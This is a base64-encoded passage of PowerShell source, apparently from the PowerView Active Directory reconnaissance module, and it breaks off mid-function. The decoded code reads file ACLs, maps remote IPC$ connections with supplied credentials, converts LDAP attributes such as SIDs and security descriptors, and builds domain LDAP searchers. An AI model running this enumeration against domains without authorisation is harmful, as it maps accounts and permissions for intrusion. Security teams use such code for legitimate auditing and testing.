ICAgICAgICAgICMgZ2V0IHJlbWFpbmluZyBleHRlbmRlZCBwZXJtaXNzaW9ucwogICAgICAgICAgICAkUGVybWlzc2lvbnMgKz0gJEFjY2Vzc01hc2suS2V5cyB8IFdoZXJlLU9iamVjdCB7ICRGU1IgLWJhbmQgJF8gfSB8IEZvckVhY2gtT2JqZWN0IHsgJEFjY2Vzc01hc2tbJF9dIH0KICAgICAgICAgICAgKCRQZXJtaXNzaW9ucyB8IFdoZXJlLU9iamVjdCB7JF99KSAtam9pbiAnLCcKICAgICAgICB9CgogICAgICAgICRDb252ZXJ0QXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb252ZXJ0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRNYXBwZWRDb21wdXRlcnMgPSBAe30KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkVGFyZ2V0UGF0aCBpbiAkUGF0aCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCgkVGFyZ2V0UGF0aCAtTWF0Y2ggJ1xcXFwuKlxcLionKSAtYW5kICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkSG9zdENvbXB1dGVyID0gKE5ldy1PYmplY3QgU3lzdGVtLlVyaSgkVGFyZ2V0UGF0aCkpLkhvc3QKICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgbWFwIElQQyQgdG8gdGhpcyBjb21wdXRlciBpZiBpdCdzIG5vdCBhbHJlYWR5CiAgICAgICAgICAgICAgICAgICAgICAgIEFkZC1SZW1vdGVDb25uZWN0aW9uIC1Db21wdXRlck5hbWUgJEhvc3RDb21wdXRlciAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdID0gJFRydWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJEFDTCA9IEdldC1BY2wgLVBhdGggJFRhcmdldFBhdGgKCiAgICAgICAgICAgICAgICAkQUNMLkdldEFjY2Vzc1J1bGVzKCRUcnVlLCAkVHJ1ZSwgW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJFNJRCA9ICRfLklkZW50aXR5UmVmZXJlbmNlLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgJE5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNJRCAkU0lEIEBDb252ZXJ0QXJndW1lbnRzCgogICAgICAgICAgICAgICAgICAgICRPdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQYXRoJyAkVGFyZ2V0UGF0aAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRmlsZVN5c3RlbVJpZ2h0cycgKENvbnZlcnQtRmlsZVJpZ2h0IC1GU1IgJF8uRmlsZVN5c3RlbVJpZ2h0cy52YWx1ZV9fKQogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2UnICROYW1lCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJZGVudGl0eVNJRCcgJFNJRAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQWNjZXNzQ29udHJvbFR5cGUnICRfLkFjY2Vzc0NvbnRyb2xUeXBlCiAgICAgICAgICAgICAgICAgICAgJE91dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRmlsZUFDTCcpCiAgICAgICAgICAgICAgICAgICAgJE91dAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtUGF0aEFjbF0gZXJyb3I6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgIyByZW1vdmUgdGhlIElQQyQgbWFwcGluZ3MKICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzLktleXMgfCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbgogICAgfQp9CgoKZnVuY3Rpb24gQ29udmVydC1MREFQUHJvcGVydHkgewo8IwouU1lOT1BTSVMKCkhlbHBlciB0aGF0IGNvbnZlcnRzIHNwZWNpZmljIExEQVAgcHJvcGVydHkgcmVzdWx0IGZpZWxkcyBhbmQgb3V0cHV0cwphIGN1c3RvbSBwc29iamVjdC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZSAgCgouREVTQ1JJUFRJT04KCkNvbnZlcnRzIGEgc2V0IG9mIHJhdyBMREFQIHByb3BlcnRpZXMgcmVzdWx0cyBmcm9tIEFEU0kvTERBUCBzZWFyY2hlcwppbnRvIGEgcHJvcGVyIFBTT2JqZWN0LiBVc2VkIGJ5IHNldmVyYWwgb2YgdGhlIEdldC1Eb21haW4qIGZ1bmN0aW9uLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpQcm9wZXJ0aWVzIG9iamVjdCB0byBleHRyYWN0IG91dCBMREFQIGZpZWxkcyBmb3IgZGlzcGxheS4KCi5PVVRQVVRTCgpTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3VzdG9tT2JqZWN0CgpBIGN1c3RvbSBQU09iamVjdCB3aXRoIExEQVAgaGFzaHRhYmxlIHByb3BlcnRpZXMgdHJhbnNsYXRlZC4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgICRQcm9wZXJ0aWVzCiAgICApCgogICAgJE9iamVjdFByb3BlcnRpZXMgPSBAe30KCiAgICAkUHJvcGVydGllcy5Qcm9wZXJ0eU5hbWVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIGlmICgkXyAtbmUgJ2Fkc3BhdGgnKSB7CiAgICAgICAgICAgIGlmICgoJF8gLWVxICdvYmplY3RzaWQnKSAtb3IgKCRfIC1lcSAnc2lkaGlzdG9yeScpKSB7CiAgICAgICAgICAgICAgICAjIGNvbnZlcnQgdGhlIFNJRCB0byBhIHN0cmluZwogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJFByb3BlcnRpZXNbJF9dWzBdLCAwKSkuVmFsdWUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRfIC1lcSAnb2JqZWN0Z3VpZCcpIHsKICAgICAgICAgICAgICAgICMgY29udmVydCB0aGUgR1VJRCB0byBhIHN0cmluZwogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gKE5ldy1PYmplY3QgR3VpZCAoLCRQcm9wZXJ0aWVzWyRfXVswXSkpLkd1aWQKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRfIC1lcSAnbnRzZWN1cml0eWRlc2NyaXB0b3InKSB7CiAgICAgICAgICAgICAgICAjICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IE5ldy1PYmplY3QgU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SYXdTZWN1cml0eURlc2NyaXB0b3IgLUFyZ3VtZW50TGlzdCAkUHJvcGVydGllc1skX11bMF0sIDAKICAgICAgICAgICAgICAgICREZXNjcmlwdG9yID0gTmV3LU9iamVjdCBTZWN1cml0eS5BY2Nlc3NDb250cm9sLlJhd1NlY3VyaXR5RGVzY3JpcHRvciAtQXJndW1lbnRMaXN0ICRQcm9wZXJ0aWVzWyRfXVswXSwgMAogICAgICAgICAgICAgICAgaWYgKCREZXNjcmlwdG9yLk93bmVyKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJ093bmVyJ10gPSAkRGVzY3JpcHRvci5Pd25lcgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCREZXNjcmlwdG9yLkdyb3VwKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJ0dyb3VwJ10gPSAkRGVzY3JpcHRvci5Hcm91cAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCREZXNjcmlwdG9yLkRpc2NyZXRpb25hcnlBY2wpIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1snRGlzY3JldGlvbmFyeUFjbCddID0gJERlc2NyaXB0b3IuRGlzY3JldGlvbmFyeUFjbAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCREZXNjcmlwdG9yLlN5c3RlbUFjbCkgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWydTeXN0ZW1BY2wnXSA9ICREZXNjcmlwdG9yLlN5c3RlbUFjbAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoICgkXyAtZXEgJ2xhc3Rsb2dvbicpIC1vciAoJF8gLWVxICdsYXN0bG9nb250aW1lc3RhbXAnKSAtb3IgKCRfIC1lcSAncHdkbGFzdHNldCcpIC1vciAoJF8gLWVxICdsYXN0bG9nb2ZmJykgLW9yICgkXyAtZXEgJ2JhZFBhc3N3b3JkVGltZScpICkgewogICAgICAgICAgICAgICAgIyBjb252ZXJ0IHRpbWVzdGFtcHMKICAgICAgICAgICAgICAgIGlmICgkUHJvcGVydGllc1skX11bMF0gLWlzIFtTeXN0ZW0uTWFyc2hhbEJ5UmVmT2JqZWN0XSkgewogICAgICAgICAgICAgICAgICAgICMgaWYgd2UgaGF2ZSBhIFN5c3RlbS5fX0NvbU9iamVjdAogICAgICAgICAgICAgICAgICAgICRUZW1wID0gJFByb3BlcnRpZXNbJF9dWzBdCiAgICAgICAgICAgICAgICAgICAgW0ludDMyXSRIaWdoID0gJFRlbXAuR2V0VHlwZSgpLkludm9rZU1lbWJlcignSGlnaFBhcnQnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXTo6R2V0UHJvcGVydHksICROdWxsLCAkVGVtcCwgJE51bGwpCiAgICAgICAgICAgICAgICAgICAgW0ludDMyXSRMb3cgID0gJFRlbXAuR2V0VHlwZSgpLkludm9rZU1lbWJlcignTG93UGFydCcsICBbU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXTo6R2V0UHJvcGVydHksICROdWxsLCAkVGVtcCwgJE51bGwpCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gKFtkYXRldGltZV06OkZyb21GaWxlVGltZShbSW50NjRdKCIweHswOng4fXsxOng4fSIgLWYgJEhpZ2gsICRMb3cpKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICMgb3RoZXJ3aXNlIGp1c3QgYSBzdHJpbmcKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAoW2RhdGV0aW1lXTo6RnJvbUZpbGVUaW1lKCgkUHJvcGVydGllc1skX11bMF0pKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRQcm9wZXJ0aWVzWyRfXVswXSAtaXMgW1N5c3RlbS5NYXJzaGFsQnlSZWZPYmplY3RdKSB7CiAgICAgICAgICAgICAgICAjIHRyeSB0byBjb252ZXJ0IG1pc2MgY29tIG9iamVjdHMKICAgICAgICAgICAgICAgICRQcm9wID0gJFByb3BlcnRpZXNbJF9dCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRUZW1wID0gJFByb3BbJF9dWzBdCiAgICAgICAgICAgICAgICAgICAgW0ludDMyXSRIaWdoID0gJFRlbXAuR2V0VHlwZSgpLkludm9rZU1lbWJlcignSGlnaFBhcnQnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXTo6R2V0UHJvcGVydHksICROdWxsLCAkVGVtcCwgJE51bGwpCiAgICAgICAgICAgICAgICAgICAgW0ludDMyXSRMb3cgID0gJFRlbXAuR2V0VHlwZSgpLkludm9rZU1lbWJlcignTG93UGFydCcsICBbU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXTo6R2V0UHJvcGVydHksICROdWxsLCAkVGVtcCwgJE51bGwpCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gW0ludDY0XSgiMHh7MDp4OH17MTp4OH0iIC1mICRIaWdoLCAkTG93KQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltDb252ZXJ0LUxEQVBQcm9wZXJ0eV0gZXJyb3I6ICRfIgogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wWyRfXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJFByb3BlcnRpZXNbJF9dLmNvdW50IC1lcSAxKSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcGVydGllc1skX11bMF0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wZXJ0aWVzWyRfXQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgdHJ5IHsKICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJE9iamVjdFByb3BlcnRpZXMKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICBXcml0ZS1XYXJuaW5nICJbQ29udmVydC1MREFQUHJvcGVydHldIEVycm9yIHBhcnNpbmcgTERBUCBwcm9wZXJ0aWVzIDogJF8iCiAgICB9Cn0KCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojCiMgRG9tYWluIGluZm8gZnVuY3Rpb25zIGJlbG93LgojCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpmdW5jdGlvbiBHZXQtRG9tYWluU2VhcmNoZXIgewo8IwouU1lOT1BTSVMKCkhlbHBlciB1c2VkIGJ5IHZhcmlvdXMgZnVuY3Rpb25zIHRoYXQgYnVpbGRzIGEgY3VzdG9tIEFEIHNlYXJjaGVyIG9iamVjdC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbiAgCgouREVTQ1JJUFRJT04KClRha2VzIGEgZ2l2ZW4gZG9tYWluIGFuZCBhIG51bWJlciBvZiBjdXN0b21pemF0aW9ucyBhbmQgcmV0dXJucyBhClN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciBvYmplY3QuIFRoaXMgZnVuY3Rpb24gaXMgdXNlZApoZWF2aWx5IGJ5IG90aGVyIExEQVAvQURTSSBzZWFyY2hlciBmdW5jdGlvbnMgKFZlcmItRG9tYWluKikuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlUHJlZml4CgpTcGVjaWZpZXMgYSBwcmVmaXggZm9yIHRoZSBMREFQIHNlYXJjaCBzdHJpbmcgKGkuZS4gIkNOPVNpdGVzLENOPUNvbmZpZ3VyYXRpb24iKS4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvIGZvciB0aGUgc2VhcmNoLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluU2VhcmNoZXIgLURvbWFpbiB0ZXN0bGFiLmxvY2FsCgpSZXR1cm4gYSBzZWFyY2hlciBmb3IgYWxsIG9iamVjdHMgaW4gdGVzdGxhYi5sb2NhbC4KCi5FWEFNUExFCgpHZXQtRG9tYWluU2VhcmNoZXIgLURvbWFpbiB0ZXN0bGFiLmxvY2FsIC1MREFQRmlsdGVyICcoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KScgLVByb3BlcnRpZXMgJ1NhbUFjY291bnROYW1lLGxhc3Rsb2dvbicKClJldHVybiBhIHNlYXJjaGVyIGZvciB1c2VyIG9iamVjdHMgaW4gdGVzdGxhYi5sb2NhbCBhbmQgb25seSByZXR1cm4gdGhlIFNhbUFjY291bnROYW1lIGFuZCBMYXN0TG9nb24gcHJvcGVydGllcy4KCi5FWEFNUExFCgpHZXQtRG9tYWluU2VhcmNoZXIgLVNlYXJjaEJhc2UgIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKClJldHVybiBhIHNlYXJjaGVyIHRoYXQgc2VhcmNoZXMgdGhyb3VnaCB0aGUgc3BlY2lmaWMgQURTL0xEQVAgc2VhcmNoIGJhc2UgKGkuZS4gT1UpLgoKLk9VVFBVVFMKClN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZVByZWZpeCwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCA9IDEyMCwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICREb21haW4KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICMgaWYgbm90IC1Eb21haW4gaXMgc3BlY2lmaWVkLCByZXRyaWV2ZSB0aGUgY3VycmVudCBkb21haW4gbmFtZQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgICREb21haW5PYmplY3QgPSBHZXQtRG9tYWluIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkRG9tYWluT2JqZWN0ID0gR2V0LURvbWFpbgogICAgICAgICAgICB9CiAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRG9tYWluT2JqZWN0Lk5hbWUKICAgICAgICB9CgogICAgICAgIGlmICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsKICAgICAgICAgICAgIyBpZiB0aGVyZSdzIG5vdCBhIHNwZWNpZmllZCBzZXJ2ZXIgdG8gYmluZCB0bywgdHJ5IHRvIHB1bGwgdGhlIGN1cnJlbnQgZG9tYWluIFBEQwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCREb21haW5PYmplY3QpIHsKICAgICAgICAgICAgICAgICAgICAkQmluZFNlcnZlciA9ICREb21haW5PYmplY3QuUGRjUm9sZU93bmVyLk5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgICAgICAkQmluZFNlcnZlciA9ICgoR2V0LURvbWFpbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCkuUGRjUm9sZU93bmVyKS5OYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkQmluZFNlcnZlciA9ICgoR2V0LURvbWFpbikuUGRjUm9sZU93bmVyKS5OYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgdGhyb3cgIltHZXQtRG9tYWluU2VhcmNoZXJdIEVycm9yIGluIHJldHJpZXZpbmcgUERDIGZvciBjdXJyZW50IGRvbWFpbjogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRCaW5kU2VydmVyID0gJFNlcnZlcgogICAgICAgIH0KCiAgICAgICAgJFNlYXJjaFN0cmluZyA9ICdMREFQOi8vJwoKICAgICAgICBpZiAoJEJpbmRTZXJ2ZXIgLWFuZCAoJEJpbmRTZXJ2ZXIuVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgJFNlYXJjaFN0cmluZyArPSAkQmluZFNlcnZlcgogICAgICAgICAgICBpZiAoJFRhcmdldERvbWFpbikgewogICAgICAgICAgICAgICAgJFNlYXJjaFN0cmluZyArPSAnLycKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZVByZWZpeCddKSB7CiAgICAgICAgICAgICRTZWFyY2hTdHJpbmcgKz0gJFNlYXJjaEJhc2VQcmVmaXggKyAnLCcKICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgewogICAgICAgICAgICBpZiAoJFNlYXJjaEJhc2UgLU1hdGNoICdeR0M6Ly8nKSB7CiAgICAgICAgICAgICAgICAjIGlmIHdlJ3JlIHNlYXJjaGluZyB0aGUgZ2xvYmFsIGNhdGFsb2csIGdldCB0aGUgcGF0aCBpbiB0aGUgcmlnaHQgZm9ybWF0C